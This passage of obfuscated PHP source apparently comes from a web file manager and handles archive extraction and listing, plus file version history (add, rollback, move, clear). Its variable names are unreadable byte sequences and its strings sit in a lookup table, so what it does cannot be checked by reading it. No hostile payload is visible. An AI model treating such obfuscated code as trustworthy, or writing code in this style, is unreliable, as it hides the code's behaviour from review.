!$‡ô¡Ã›) { if ($‡ô¡Ã› && strstr($‡ô¡Ã›, TEMP_FILES)) { $ù½›Ş·¼ = $ëı‘îë² = array(); recursion_dir($÷°Áªı, $ù½›Ş·¼, $ëı‘îë², 0); foreach ($ù½›Ş·¼ as $è«Şõİ) { del_dir($è«Şõİ); } foreach ($ëı‘îë² as $—â˜ÄŒ) { if ($—â˜ÄŒ == $£¹¬úŞ) { continue; } del_file($—â˜ÄŒ); } } return $´Ü…É°ò; } $¯ ¥ÜÁ´ = self::pathFather($¬Ê’ªÜ„[$”»“À³¼[88]]); $²ÈïÎ±ı = self::move($´Ü…É°ò, $¯ ¥ÜÁ´, $ì¸ô”áö); if (!$²ÈïÎ±ı) { del_dir($‡ô¡Ã›); show_json(LNG($”»“À³¼[1196]), !1); } del_dir($‡ô¡Ã›); return $²ÈïÎ±ı; } public static function unzip($ÖÉœÙÚ˜, $Ö²úı¦± = "\162\145\160\x6c\x61\143\145") { $Ú‰ãÀ¢ß =& $_SERVER[¯µç›È¢]; $¦´è‘ŞÅ = $ÖÉœÙÚ˜[$Ú‰ãÀ¢ß[88]]; $‡Ğ¤¾€î = $ÖÉœÙÚ˜[$Ú‰ãÀ¢ß[1197]]; if (!($×û›ÑÂÛ = parent::info($¦´è‘ŞÅ))) { show_json(LNG($Ú‰ãÀ¢ß[1198]), !1); } if (!($ëõ“Ù®¨ = parent::infoFull($‡Ğ¤¾€î))) { $‡Ğ¤¾€î = parent::mkdir($‡Ğ¤¾€î); $ëõ“Ù®¨ = array($Ú‰ãÀ¢ß[88] => $‡Ğ¤¾€î); } else { if (isset($ëõ“Ù®¨[$Ú‰ãÀ¢ß[408]]) && trim($ëõ“Ù®¨[$Ú‰ãÀ¢ß[88]], $Ú‰ãÀ¢ß[8]) != trim($‡Ğ¤¾€î, $Ú‰ãÀ¢ß[8])) { $¢”èØ²Ÿ = KodIO::make($ëõ“Ù®¨[$Ú‰ãÀ¢ß[503]]); $‡éŒÂß¿ = parent::fileNameAuto($¢”èØ²Ÿ, $ëõ“Ù®¨[$Ú‰ãÀ¢ß[32]], REPEAT_RENAME_FOLDER, !0); $‡Ğ¤¾€î = parent::mkdir($¢”èØ²Ÿ . $‡éŒÂß¿); $ëõ“Ù®¨ = array($Ú‰ãÀ¢ß[88] => $‡Ğ¤¾€î); } } $‡Ğ¤¾€î = $ëõ“Ù®¨[$Ú‰ãÀ¢ß[88]]; $ÈŞ´õ«Ø = self::tmpFileName($×û›ÑÂÛ); $˜—»Ÿ¹ = TEMP_FILES . $ÈŞ´õ«Ø; del_dir($˜—»Ÿ¹); mk_dir($˜—»Ÿ¹); $›¨í¨Ú— = self::fileExt($×û›ÑÂÛ); $ÜßƒÅşÁ = $˜—»Ÿ¹ . $Ú‰ãÀ¢ß[10] . $›¨í¨Ú—; if (!@file_exists(self::iconvSystem($ÜßƒÅşÁ))) { $Ûİ›Ê»÷ = self::localFilePath($¦´è‘ŞÅ, $›¨í¨Ú—); $ÜßƒÅşÁ = $Ûİ›Ê»÷ ? $Ûİ›Ê»÷ : parent::download($¦´è‘ŞÅ, $ÜßƒÅşÁ); } $ÜßƒÅşÁ = self::iconvSystem($ÜßƒÅşÁ); $ÍŠ–Êºê = isset($ÖÉœÙÚ˜[$Ú‰ãÀ¢ß[1199]]) ? $ÖÉœÙÚ˜[$Ú‰ãÀ¢ß[1199]] : $Ú‰ãÀ¢ß[1200]; $†ø¨îìÎ = KodArchive::extract($ÜßƒÅşÁ, $˜—»Ÿ¹ . $Ú‰ãÀ¢ß[8], $ÍŠ–Êºê); self::archiveExt(); if (!$†ø¨îìÎ[$Ú‰ãÀ¢ß[1201]]) { show_json($Ú‰ãÀ¢ß[1202] . $†ø¨îìÎ[$Ú‰ãÀ¢ß[1203]], !1); } Hook::trigger($Ú‰ãÀ¢ß[1204], $˜—»Ÿ¹); recursion_dir($˜—»Ÿ¹, $œñ´êºñ, $ü½–’©›, 0); $Ùƒ„•¦Å = array_merge($œñ´êºñ, $ü½–’©›); foreach ($Ùƒ„•¦Å as $ˆöò³) { $ˆöò³ = self::iconvApp($ˆöò³); self::move($ˆöò³, $‡Ğ¤¾€î, $Ö²úı¦±); } del_dir($˜—»Ÿ¹); if (!$Ûİ›Ê»÷) { del_file($ÜßƒÅşÁ); } return !0; } public static function unzipList($ÌïéöØ’) { $óÉ…ïßò =& $_SERVER[¯µç›È¢]; $òé†•Å = $ÌïéöØ’[$óÉ…ïßò[88]]; $ãòòÍ¡© = isset($ÌïéöØ’[$óÉ…ïßò[1205]]) ? $ÌïéöØ’[$óÉ…ïßò[1205]] : -1; $…µÀ ûò = 50000; if (request_url_safe($òé†•Å)) { $ö†ŸÀ€Ş = parse_url_query($òé†•Å); if (!isset($ö†ŸÀ€Ş[$óÉ…ïßò[88]])) { show_json($óÉ…ïßò[1206], !1); } } $§ëåÁã² = isset($ö†ŸÀ€Ş) ? $ö†ŸÀ€Ş[$óÉ…ïßò[88]] : $òé†•Å; $‘ó¶Ùí = self::info($§ëåÁã²); $­­ºÍ = self::fileExt($‘ó¶Ùí); $ŠÃş«ó· = self::tmpFileName($‘ó¶Ùí); if (isset($ö†ŸÀ€Ş)) { $õ™Õ¤ = array($ö†ŸÀ€Ş[$óÉ…ïßò[88]], $ö†ŸÀ€Ş[$óÉ…ïßò[1205]], $ö†ŸÀ€Ş[$óÉ…ïßò[32]]); $•ß°ÔÛı = md5(implode($óÉ…ïßò[11], $õ™Õ¤)) . $óÉ…ïßò[10] . get_path_ext($ö†ŸÀ€Ş[$óÉ…ïßò[32]]); } else { $õ™Õ¤ = array($‘ó¶Ùí[$óÉ…ïßò[32]], $‘ó¶Ùí[$óÉ…ïßò[88]], $‘ó¶Ùí[$óÉ…ïßò[90]]); $•ß°ÔÛı = md5(implode($óÉ…ïßò[11], $õ™Õ¤)) . $óÉ…ïßò[10] . $­­ºÍ; } if ($ãòòÍ¡© == -1) { $á“òâøì = IO_PATH_SYSTEM_TEMP . "\172\x69\x70\126\x69\x65\x77\57{$ŠÃş«ó·}\57{$•ß°ÔÛı}\56\x6c\157\147"; $æÇÊØ‰ = self::infoFull($á“òâøì); if ($æÇÊØ‰) { $á“òâøì = $æÇÊØ‰[$óÉ…ïßò[88]]; $Öòˆ¿÷ß = self::getContent($á“òâøì); if ($Öòˆ¿÷ß) { $²½°–Ç = json_decode($Öòˆ¿÷ß, !0); $²½°–Ç = is_array($²½°–Ç) ? $²½°–Ç : array(); if (count($²½°–Ç) >= $…µÀ ûò) { show_json(sprintf(LNG($óÉ…ïßò[1207]), count($²½°–Ç)), !1); } return $²½°–Ç; } } else { $á“òâøì = self::mkfile($á“òâøì); } } $õØ‡ÎÁ¦ = TEMP_FILES . $ŠÃş«ó·; if (!is_dir($õØ‡ÎÁ¦)) { mk_dir($õØ‡ÎÁ¦); } $ÜßÍ×’÷ = $õØ‡ÎÁ¦ . $óÉ…ïßò[8] . $•ß°ÔÛı; if (!@file_exists(self::iconvSystem($ÜßÍ×’÷))) { if (isset($ö†ŸÀ€Ş)) { url_request($òé†•Å, $óÉ…ïßò[1208], $ÜßÍ×’÷); } else { $ËÒà£à¼ = self::localFilePath($òé†•Å, $­­ºÍ); $ÜßÍ×’÷ = $ËÒà£à¼ ? $ËÒà£à¼ : self::download($òé†•Å, $ÜßÍ×’÷); } } $ÜßÍ×’÷ = self::iconvSystem($ÜßÍ×’÷); if ($ãòòÍ¡© >= 0) { $”²ºÊòÀ = isset($ÌïéöØ’[$óÉ…ïßò[1209]]) ? $ÌïéöØ’[$óÉ…ïßò[1209]] : !1; $§êÈ¡Œ± = isset($ÌïéöØ’[$óÉ…ïßò[32]]) ? $ÌïéöØ’[$óÉ…ïßò[32]] : $óÉ…ïßò[12]; KodArchive::filePreview($ÜßÍ×’÷, $ãòòÍ¡©, $”²ºÊòÀ, $§êÈ¡Œ±); self::archiveExt(); die; } $Ï°ÙÚ·‡ = KodArchive::listContent($ÜßÍ×’÷); self::archiveExt(); del_dir($õØ‡ÎÁ¦); if (!$Ï°ÙÚ·‡[$óÉ…ïßò[1201]]) { show_json($Ï°ÙÚ·‡[$óÉ…ïßò[1203]], !1); } $²½°–Ç = json_encode($Ï°ÙÚ·‡[$óÉ…ïßò[1203]]); self::setContent($á“òâøì, $²½°–Ç); if (count($Ï°ÙÚ·‡[$óÉ…ïßò[1203]]) >= $…µÀ ûò) { show_json(sprintf(LNG($óÉ…ïßò[1207]), count($Ï°ÙÚ·‡[$óÉ…ïßò[1203]])), !1); } return $Ï°ÙÚ·‡[$óÉ…ïßò[1203]]; } private static function fileExt($‚æÔ¨«¾) { $ÒÛ÷…®Õ =& $_SERVER[¯µç›È¢]; $¯®şï²Ğ = $‚æÔ¨«¾[$ÒÛ÷…®Õ[181]]; if ($¯®şï²Ğ == $ÒÛ÷…®Õ[1210]) { $ÖË²é = $ÒÛ÷…®Õ[1211]; if (substr($‚æÔ¨«¾[$ÒÛ÷…®Õ[32]], -strlen($ÖË²é)) == $ÖË²é) { $¯®şï²Ğ = $ÒÛ÷…®Õ[1212]; } } self::archiveExt($¯®şï²Ğ); return $¯®şï²Ğ; } private static function zipFileList($×ƒêåÊß, $Äé¸ø½ = false) { $Â–•§ïĞ =& $_SERVER[¯µç›È¢]; $‰Öó¸¿† = array(); foreach ($×ƒêåÊß as $åİ†üÖ¸) { $ééìå¡ó = $åİ†üÖ¸[$Â–•§ïĞ[88]]; if ($Äé¸ø½) { $ééìå¡ó = self::copy($åİ†üÖ¸[$Â–•§ïĞ[88]], $Äé¸ø½, $Â–•§ïĞ[835]); } else { $ÖÆ¥›Ö = self::init($åİ†üÖ¸[$Â–•§ïĞ[88]]); if ($ÖÆ¥›Ö->getType() == $Â–•§ïĞ[117]) { $ééìå¡ó = $ÖÆ¥›Ö->path; } } if ($ééìå¡ó && self::local()->exist($ééìå¡ó)) { $‰Öó¸¿†[$åİ†üÖ¸[$Â–•§ïĞ[88]]] = $ééìå¡ó; } } if (!empty($‰Öó¸¿†)) { return array_values($‰Öó¸¿†); } show_json(LNG($Â–•§ïĞ[1176]), !1); } public static function tmpFileName($‡ŞĞ‰õ¶) { $¨ÏÉ„ş³ =& $_SERVER[¯µç›È¢]; $ËûÕ›Õ” = array($‡ŞĞ‰õ¶[$¨ÏÉ„ş³[32]], $‡ŞĞ‰õ¶[$¨ÏÉ„ş³[88]], $‡ŞĞ‰õ¶[$¨ÏÉ„ş³[90]], $‡ŞĞ‰õ¶[$¨ÏÉ„ş³[526]]); return md5(implode($¨ÏÉ„ş³[11], $ËûÕ›Õ”)); } private static function localFilePath($™ë¶´‰, $Š¶İÇ©î) { $Ğä±Ç³ =& $_SERVER[¯µç›È¢]; if ($Š¶İÇ©î == $Ğä±Ç³[1213] && strtoupper(substr(PHP_OS, 0, 3)) == $Ğä±Ç³[1214]) { return !1; } $ö™“¬Êé = KodIO::parse($™ë¶´‰); if ($ö™“¬Êé[$Ğä±Ç³[33]] == KodIO::KOD_SOURCE) { $àÆÎ‚…ó = Model($Ğä±Ç³[842])->fileInfoGet(KodIO::sourceID($™ë¶´‰)); if (!$àÆÎ‚…ó[$Ğä±Ç³[88]]) { show_json($Ğä±Ç³[1215], !1); } $™ë¶´‰ = $àÆÎ‚…ó[$Ğä±Ç³[88]]; } $Ä·Â“çĞ = self::init($™ë¶´‰); if ($Ä·Â“çĞ->pathParse[$Ğä±Ç³[1163]]) { $™ë¶´‰ = $Ä·Â“çĞ->pathParse[$Ğä±Ç³[1163]]; $Ä·Â“çĞ = self::init($™ë¶´‰); } $Æ­ô‘° = $Ä·Â“çĞ->getType(); if ($Æ­ô‘° == $Ğä±Ç³[117] || $Æ­ô‘° == $Ğä±Ç³[1216]) { if (!$Ä·Â“çĞ->exist($Ä·Â“çĞ->path)) { show_json(LNG($Ğä±Ç³[116]), !1); } return $Ä·Â“çĞ->path; } return !1; } private static function archiveExt($®€¢›¢ß = '') { $GLOBALS[$_SERVER[¯µç›È¢][1217]] = $®€¢›¢ß; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ÃŸàÎõ‰ =& $_SERVER[¯µç›È¢]; $ıá†ÔßÑ = $GLOBALS[$ÃŸàÎõ‰[6]][$ÃŸàÎõ‰[100]]; if ($ıá†ÔßÑ[$ÃŸàÎõ‰[1218]] != 1) { return; } if ($ıá†ÔßÑ[$ÃŸàÎõ‰[1219]] <= 0) { return; } if (isset($_REQUEST[$ÃŸàÎõ‰[1220]]) && $_REQUEST[$ÃŸàÎõ‰[1220]] == $ÃŸàÎõ‰[99]) { return; } Hook::bind($ÃŸàÎõ‰[1221], $ÃŸàÎõ‰[1222]); Hook::bind($ÃŸàÎõ‰[1223], $ÃŸàÎõ‰[1224]); Hook::bind($ÃŸàÎõ‰[1225], $ÃŸàÎõ‰[1226]); Hook::bind($ÃŸàÎõ‰[1227], $ÃŸàÎõ‰[1228]); Hook::bind($ÃŸàÎõ‰[1229], $ÃŸàÎõ‰[1230]); Hook::bind($ÃŸàÎõ‰[1231], $ÃŸàÎõ‰[1232]); } public static function eventBeforeUpload($óÓÛüª) { if ($óÓÛüª[3] && $óÓÛüª[3] != REPEAT_REPLACE) { return; } $ªØÈÀ¤ = self::parsePath($óÓÛüª[0]); if (!$ªØÈÀ¤) { return; } self::add($ªØÈÀ¤); } public static function eventBeforeEdit($ØÄ²Äò²) { $ù“Ê×³Ù = self::parsePath($ØÄ²Äò²[0]); if (!$ù“Ê×³Ù) { return; } self::add($ù“Ê×³Ù); } public static function eventBeforeCopyFile($´ó²ç±í, $ªê€­­Ú, $ÍÜä³œø, $”¦ÎÇÙ, $Á”¡±Šó, $Ş©—ä) { $øÊŒµ´¨ = $ÍÜä³œø->getPathOuter($”¦ÎÇÙ); $³Ÿ¥‘û = self::parsePath($øÊŒµ´¨); if (!$³Ÿ¥‘û) { return; } self::add($³Ÿ¥‘û); } public static function eventBeforeRename($–ª‚ïøª) { $íò©•± =& $_SERVER[¯µç›È¢]; $‰Ñ¬‹”ˆ = self::parsePath($–ª‚ïøª[0]); if (!$‰Ñ¬‹”ˆ) { return; } $Ê€ÁÙˆš = self::checkInHistory($‰Ñ¬‹”ˆ); if (!$Ê€ÁÙˆš) { return; } if ($Ê€ÁÙˆš[$íò©•±[33]] == $íò©•±[206]) { $àˆ›ËÕÌ = self::listData($‰Ñ¬‹”ˆ); if ($àˆ›ËÕÌ && $àˆ›ËÕÌ[$íò©•±[377]]) { self::moveHistory($‰Ñ¬‹”ˆ, $–ª‚ïøª[1]); } } else { IO::rename($Ê€ÁÙˆš[$íò©•±[88]], $–ª‚ïøª[1]); } } public static function eventBeforeMove($ÒşÀß) { $ ³Ğ¦ú =& $_SERVER[¯µç›È¢]; $½ê¾†ˆ¤ = self::parsePath($ÒşÀß[0]); if (!$½ê¾†ˆ¤) { return; } $ÕùÕ¡Ú© = self::parsePath($ÒşÀß[1]); if (!$ÕùÕ¡Ú©) { return; } $š¡¬©²Ã = $ÒşÀß[3]; $¸Ã‹Ë²³ = self::checkInHistory($½ê¾†ˆ¤); if (!$¸Ã‹Ë²³) { return; } $õ¢™ğàË = self::pathHistory($ÕùÕ¡Ú©); if ($¸Ã‹Ë²³[$ ³Ğ¦ú[33]] == $ ³Ğ¦ú[206]) { $ûíª®ú = self::listData($½ê¾†ˆ¤); $öåñÛ¹œ = rtrim($ÕùÕ¡Ú©, $ ³Ğ¦ú[8]) . $ ³Ğ¦ú[8] . ($š¡¬©²Ã ? $š¡¬©²Ã : get_path_this($½ê¾†ˆ¤)); $‡ÍÚß¬© = self::listData($öåñÛ¹œ); if ($ûíª®ú && $ûíª®ú[$ ³Ğ¦ú[377]] && $‡ÍÚß¬© && $‡ÍÚß¬©[$ ³Ğ¦ú[377]]) { return self::clear($½ê¾†ˆ¤); } if ($ûíª®ú && $ûíª®ú[$ ³Ğ¦ú[377]]) { self::moveHistory($½ê¾†ˆ¤, $š¡¬©²Ã, $õ¢™ğàË); } } else { IO::move($¸Ã‹Ë²³[$ ³Ğ¦ú[88]], $õ¢™ğàË, !1, $š¡¬©²Ã); self::clearEmptyFolder(IO::pathFather($¸Ã‹Ë²³[$ ³Ğ¦ú[88]])); } } public static function eventAfterRemove($ÈöÓï–Ï, $şøõĞÕ) { $‡ÉÎÒƒ¿ =& $_SERVER[¯µç›È¢]; if (!$şøõĞÕ) { return; } $Á¢ŒüŠç = self::parsePath($ÈöÓï–Ï[0]); if (!$Á¢ŒüŠç) { return; } $ÌÉå±¦´ = self::checkInHistory($Á¢ŒüŠç); if (!$ÌÉå±¦´) { return; } if ($ÌÉå±¦´[$‡ÉÎÒƒ¿[33]] == $‡ÉÎÒƒ¿[206]) { $®©Ûå– = self::listData($Á¢ŒüŠç, !1); if ($®©Ûå– && $®©Ûå–[$‡ÉÎÒƒ¿[377]]) { self::clear($Á¢ŒüŠç, !1); } } else { IO::remove($ÌÉå±¦´[$‡ÉÎÒƒ¿[88]]); self::clearEmptyFolder(IO::pathFather($ÌÉå±¦´[$‡ÉÎÒƒ¿[88]])); } } private static function checkInHistory($ñ”£á­¦) { $ ÕÉâš£ = self::pathHistory($ñ”£á­¦); if (!IO::exist($ ÕÉâš£)) { $ ÕÉâš£ .= $_SERVER[¯µç›È¢][1233]; } return IO::exist($ ÕÉâš£) ? IO::info($ ÕÉâš£) : !1; } private static function parsePath($ÆıèÖÙ) { $û“«”ƒĞ =& $_SERVER[¯µç›È¢]; if (!$ÆıèÖÙ) { return !1; } if ($GLOBALS[$û“«”ƒĞ[1234]]) { return; } $ø”½Êù… = KodIO::parse($ÆıèÖÙ); $§ŸÒñìà = $ø”½Êù…[$û“«”ƒĞ[33]]; $Ÿöİäèş = !$§ŸÒñìà || $§ŸÒñìà == KodIO::KOD_IO || $§ŸÒñìà == KodIO::KOD_SHARE_ITEM; if (!$Ÿöİäèş || !$ø”½Êù…[$û“«”ƒĞ[1235]]) { return !1; } if (substr($ÆıèÖÙ, 0, strlen(DATA_PATH . $û“«”ƒĞ[1236])) == DATA_PATH . $û“«”ƒĞ[1236]) { return !1; } if ($§ŸÒñìà == KodIO::KOD_SHARE_ITEM) { $‘İı¦çÏ = IO::init($ÆıèÖÙ); if ($‘İı¦çÏ->pathParse[$û“«”ƒĞ[1163]]) { return self::parsePath($‘İı¦çÏ->pathParse[$û“«”ƒĞ[1163]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $Ä¼Ê£± = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $û“«”ƒĞ[1237]); foreach ($Ä¼Ê£± as $ó›Ç›ì¿) { if (!$§ŸÒñìà && substr($ÆıèÖÙ, 0, strlen($ó›Ç›ì¿)) == $ó›Ç›ì¿) { return !1; } } self::log($GLOBALS[$û“«”ƒĞ[1158]] . $û“«”ƒĞ[1238] . $ÆıèÖÙ); return $ÆıèÖÙ; } private static function pathHistory($Ü ‚ş…¥) { $…„é½´¤ =& $_SERVER[¯µç›È¢]; $îŠšğ­ = self::$_historyBase . ltrim(KodIO::clear($Ü ‚ş…¥), $…„é½´¤[8]); $îŠšğ­ = str_replace(array($…„é½´¤[1239]), array($…„é½´¤[1240]), $îŠšğ­); return $îŠšğ­; } public static function log($½•Ú¨) { } public static function historyCount($©Ô•´š¦) { $¹åËïÓú =& $_SERVER[¯µç›È¢]; $ô°ÇÉÔè = array(); $×‚óÄ¿Ÿ = array(); foreach ($©Ô•´š¦ as $ ³€•ã) { $ªñ¬Õ¢ø = get_path_father($ ³€•ã); if (!$×‚óÄ¿Ÿ[$ªñ¬Õ¢ø]) { $×‚óÄ¿Ÿ[$ªñ¬Õ¢ø] = array(); } $×‚óÄ¿Ÿ[$ªñ¬Õ¢ø][] = get_path_this($ ³€•ã); } foreach ($×‚óÄ¿Ÿ as $ªñ¬Õ¢ø => $ªñÓ®ß’) { $°•øïñ = self::parsePath($ªñ¬Õ¢ø); if (!$°•øïñ) { continue; } foreach ($ªñÓ®ß’ as $Åâ“ñà¡) { $‘Šİ—¸ = self::listData(rtrim($°•øïñ, $¹åËïÓú[8]) . $¹åËïÓú[8] . $Åâ“ñà¡, !1); if ($‘Šİ—¸ && $‘Šİ—¸[$¹åËïÓú[377]]) { $ô°ÇÉÔè[rtrim($ªñ¬Õ¢ø, $¹åËïÓú[8]) . $¹åËïÓú[8] . $Åâ“ñà¡] = count($‘Šİ—¸[$¹åËïÓú[377]]); } } } return $ô°ÇÉÔè; } public static function add($ù»˜ó§Ò) { $³ÙÒ¢ÖÈ =& $_SERVER[¯µç›È¢]; $·ãÏ’×ü = self::listData($ù»˜ó§Ò); if (!$·ãÏ’×ü) { return; } $§ä™¡Ãì = Model($³ÙÒ¢ÖÈ[787])->get($³ÙÒ¢ÖÈ[1241]); $´§´Ş®ë = $GLOBALS[$³ÙÒ¢ÖÈ[6]][$³ÙÒ¢ÖÈ[100]][$³ÙÒ¢ÖÈ[1219]]; $ºÜºßàÃ = $§ä™¡Ãì == $³ÙÒ¢ÖÈ[1242] ? 5 : $´§´Ş®ë; if ($´§´Ş®ë <= 0) { return; } $‹§Â¥™ = IO::hashSimple($ù»˜ó§Ò); $µšÉïñ² = IO::info($ù»˜ó§Ò); $õÌ€ÕÎÆ = $·ãÏ’×ü[$³ÙÒ¢ÖÈ[377]]; if ($µšÉïñ²[$³ÙÒ¢ÖÈ[90]] == 0) { return; } if ($µšÉïñ²[$³ÙÒ¢ÖÈ[90]] >= 1024 * 1024 * 500) { return !1; } if ($õÌ€ÕÎÆ && $õÌ€ÕÎÆ[0][$³ÙÒ¢ÖÈ[184]] == $‹§Â¥™) { return !0; } if (array_key_exists($³ÙÒ¢ÖÈ[209], $µšÉïñ²) && !$µšÉïñ²[$³ÙÒ¢ÖÈ[209]]) { return !1; } $¥™îØ¤ = short_id(time()); $’Çàëƒª = array($³ÙÒ¢ÖÈ[405] => $¥™îØ¤, $³ÙÒ¢ÖÈ[184] => $‹§Â¥™, $³ÙÒ¢ÖÈ[32] => $µšÉïñ²[$³ÙÒ¢ÖÈ[32]] . $³ÙÒ¢ÖÈ[10] . date($³ÙÒ¢ÖÈ[1243]) . rand_string(1), $³ÙÒ¢ÖÈ[90] => $µšÉïñ²[$³ÙÒ¢ÖÈ[90]], $³ÙÒ¢ÖÈ[457] => USER_ID, $³ÙÒ¢ÖÈ[207] => time(), $³ÙÒ¢ÖÈ[1244] => $³ÙÒ¢ÖÈ[12]); IO::mkdir($·ãÏ’×ü[$³ÙÒ¢ÖÈ[1245]]); $¶ÆñÕæ = IO::copy($ù»˜ó§Ò, $·ãÏ’×ü[$³ÙÒ¢ÖÈ[1245]], !1, $’Çàëƒª[$³ÙÒ¢ÖÈ[32]]); if (!$¶ÆñÕæ) { self::clearEmptyFolder($·ãÏ’×ü[$³ÙÒ¢ÖÈ[1245]]); return !1; } array_unshift($õÌ€ÕÎÆ, $’Çàëƒª); if (count($õÌ€ÕÎÆ) > $ºÜºßàÃ) { $¯ÍÜä‘ = array_slice($õÌ€ÕÎÆ, $ºÜºßàÃ); foreach ($¯ÍÜä‘ as $ëã´®´«) { IO::remove($·ãÏ’×ü[$³ÙÒ¢ÖÈ[1245]] . $ëã´®´«[$³ÙÒ¢ÖÈ[32]]); } $õÌ€ÕÎÆ = array_slice($õÌ€ÕÎÆ, 0, $ºÜºßàÃ); } return self::saveData($·ãÏ’×ü[$³ÙÒ¢ÖÈ[1246]], $õÌ€ÕÎÆ); } public static function remove($¨š¡à¬¿, $çÊ„ª‡) { $ú‹è¢õÖ =& $_SERVER[¯µç›È¢]; $¤ä·Ğ¾Ù = self::listData($¨š¡à¬¿); $™°‰½Êî = array(); if (!$¤ä·Ğ¾Ù) { return !1; } foreach ($¤ä·Ğ¾Ù[$ú‹è¢õÖ[377]] as $Îûã†Œ˜) { if ($Îûã†Œ˜[$ú‹è¢õÖ[405]] == $çÊ„ª‡) { IO::remove($¤ä·Ğ¾Ù[$ú‹è¢õÖ[1245]] . $Îûã†Œ˜[$ú‹è¢õÖ[32]]); continue; } $™°‰½Êî[] = $Îûã†Œ˜; } return self::saveData($¤ä·Ğ¾Ù[$ú‹è¢õÖ[1246]], $™°‰½Êî); } public static function clear($šÙ¥°­ˆ, $Çâ±›™ = true) { $ ü±ŸÁ =& $_SERVER[¯µç›È¢]; $¶¨Œ¤˜€ = self::listData($šÙ¥°­ˆ, $Çâ±›™); if (!$¶¨Œ¤˜€) { return !1; } foreach ($¶¨Œ¤˜€[$ ü±ŸÁ[377]] as $§Ò¨âõ¦) { IO::remove($¶¨Œ¤˜€[$ ü±ŸÁ[1245]] . $§Ò¨âõ¦[$ ü±ŸÁ[32]]); } return self::saveData($¶¨Œ¤˜€[$ ü±ŸÁ[1246]], array()); } public static function moveHistory($¨”“¡ç, $«¯¤Êª = '', $ÀÈèŒÄ½ = '') { $÷ì£¬”­ =& $_SERVER[¯µç›È¢]; $‘“«ĞğÙ = self::listData($¨”“¡ç, !1); if (!$‘“«ĞğÙ || !$‘“«ĞğÙ[$÷ì£¬”­[377]]) { return !1; } $Èû»Ôë¡ = $÷ì£¬”­[1233]; $«¯¤Êª = $«¯¤Êª ? $«¯¤Êª : get_path_this($¨”“¡ç); $ÀÈèŒÄ½ = $ÀÈèŒÄ½ ? $ÀÈèŒÄ½ : $‘“«ĞğÙ[$÷ì£¬”­[1245]]; $ûîØ¨ ¬ = substr(get_path_this($‘“«ĞğÙ[$÷ì£¬”­[1246]]), 0, -strlen($Èû»Ôë¡)); foreach ($‘“«ĞğÙ[$÷ì£¬”­[377]] as $àÔİÜ· => $±¬Ú ´â) { $ß£—à Î = $«¯¤Êª . substr($±¬Ú ´â[$÷ì£¬”­[32]], strlen($ûîØ¨ ¬)); $ıµ™œ¾î = IO::move($‘“«ĞğÙ[$÷ì£¬”­[1245]] . $±¬Ú ´â[$÷ì£¬”­[32]], $ÀÈèŒÄ½, !1, $ß£—à Î); if ($ıµ™œ¾î) { $‘“«ĞğÙ[$÷ì£¬”­[377]][$àÔİÜ·][$÷ì£¬”­[32]] = $ß£—à Î; } } $‘“«ĞğÙ[$÷ì£¬”­[1246]] = IO::move($‘“«ĞğÙ[$÷ì£¬”­[1246]], $ÀÈèŒÄ½, !1, $«¯¤Êª . $Èû»Ôë¡); self::saveData($‘“«ĞğÙ[$÷ì£¬”­[1246]], $‘“«ĞğÙ[$÷ì£¬”­[377]]); self::clearEmptyFolder($‘“«ĞğÙ[$÷ì£¬”­[1245]]); } public static function rollback($Ìõ­Éöã, $èÌ”¥û») { $®ÄáÁÃ¨ =& $_SERVER[¯µç›È¢]; $úÒÙ†ğ = self::listData($Ìõ­Éöã); if (!$úÒÙ†ğ) { return; } $™ë”ƒï = IO::info($Ìõ­Éöã); foreach ($úÒÙ†ğ[$®ÄáÁÃ¨[377]] as $İ²âê… => $£ÃĞÉñÍ) { if ($£ÃĞÉñÍ[$®ÄáÁÃ¨[405]] == $èÌ”¥û») { self::add($Ìõ­Éöã); $òŸ¥Äª× = $úÒÙ†ğ[$®ÄáÁÃ¨[1245]] . $£ÃĞÉñÍ[$®ÄáÁÃ¨[32]]; $¬Ìì ó² = IO::copy($òŸ¥Äª×, IO::pathFather($Ìõ­Éöã), REPEAT_REPLACE, $™ë”ƒï[$®ÄáÁÃ¨[32]]); if ($¬Ìì ó²) { self::remove($Ìõ­Éöã, $èÌ”¥û»); } return $¬Ìì ó²; } } return !1; } public static function setDetail($Ëğ£œö, $ÎÂ´ˆ°¤, $Í®ê¦ûœ) { $Ë¹øÃ =& $_SERVER[¯µç›È¢]; $šû‘ğâ¾ = self::listData($Ëğ£œö); if (!$šû‘ğâ¾) { return; } foreach ($šû‘ğâ¾[$Ë¹øÃ[377]] as $çşáÆ¤È => $œØ½²) { if ($œØ½²[$Ë¹øÃ[405]] == $ÎÂ´ˆ°¤) { $šû‘ğâ¾[$Ë¹øÃ[377]][$çşáÆ¤È][$Ë¹øÃ[1244]] = $Í®ê¦ûœ; self::saveData($šû‘ğâ¾[$Ë¹øÃ[1246]], $šû‘ğâ¾[$Ë¹øÃ[377]]); return !0; } } return !1; } public static function fileInfo($„àˆÕÛò, $’şíÀÁë) { $÷êã¼€ì =& $_SERVER[¯µç›È¢]; $¤ÄÌŞï = self::listData($„àˆÕÛò); if (!$¤ÄÌŞï) { show_json(LNG($÷êã¼€ì[116]), !1); } $˜™¨›î¡ = $÷êã¼€ì[12]; foreach ($¤ÄÌŞï[$÷êã¼€ì[377]] as $±¹½Ø§¦ => $œâĞÄ›å) { if ($œâĞÄ›å[$÷êã¼€ì[405]] != $’şíÀÁë) { continue; } $˜™¨›î¡ = $¤ÄÌŞï[$÷êã¼€ì[1245]] . $œâĞÄ›å[$÷êã¼€ì[32]]; break; } if (!$˜™¨›î¡) { show_json(LNG($÷êã¼€ì[116]), !1); } return IO::info($˜™¨›î¡); } public static function fileOut($¯Ñ‹ÒºÕ, $ïÑû€Öø, $ûâ­¢Šä = false) { $€¶ ¿óà =& $_SERVER[¯µç›È¢]; $îèÅ§…Ó = self::fileInfo($¯Ñ‹ÒºÕ, $ïÑû€Öø); $òÕÙ¿Î„ =& $GLOBALS[$€¶ ¿óà[7]]; $ûâ­¢Šä = isset($òÕÙ¿Î„[$€¶ ¿óà[1209]]) && $òÕÙ¿Î„[$€¶ ¿óà[1209]] == 1; if (isset($òÕÙ¿Î„[$€¶ ¿óà[33]]) && $òÕÙ¿Î„[$€¶ ¿óà[33]] == $€¶ ¿óà[1247]) { return IO::fileOutImage($îèÅ§…Ó[$€¶ ¿óà[88]], $òÕÙ¿Î„[$€¶ ¿óà[1248]]); } IO::fileOut($îèÅ§…Ó[$€¶ ¿óà[88]], $ûâ­¢Šä, 